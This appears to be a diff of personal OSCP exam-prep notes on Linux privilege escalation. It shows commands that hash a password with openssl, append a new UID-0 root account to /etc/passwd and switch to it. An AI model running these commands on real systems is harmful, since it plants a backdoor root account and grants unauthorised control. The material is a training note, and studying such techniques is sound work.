@@ -2,16 +2,19 @@
 #### /etc/passwd
 ```
 ┌─[root@edu-virtualbox]─[/home/edu/OSCP]
-└──╼ #openssl passwd test                  // Generates a hash for the password "test"
-$1$DKMFKcga$b3o3/0YsnCTiWu1osH/o7.
-┌─[root@edu-virtualbox]─[/home/edu/OSCP]
-└──╼ #echo "eduw:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+└──╼ #openssl passwd test
+$1$AjcbF6Z3$txY0x34m/KGP/AeiBbiDB1         //  Generates a hash for the password "test"
 
-$1$DiHR7PJR$P2yZJ1c8nRjKr0V1l4.uW/
+┌─[root@edu-virtualbox]─[/home/edu/OSCP]
+└──╼ #echo 'eduw:$1$AjcbF6Z3$txY0x34m/KGP/AeiBbiDB1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+┌─[root@edu-virtualbox]─[/home/edu/OSCP]
+└──╼ #su eduw
 
 ```
 
 #### /etc/shadow
+Note: this is very risky, as you'll need to change an existing password.
 ```
 
 ```
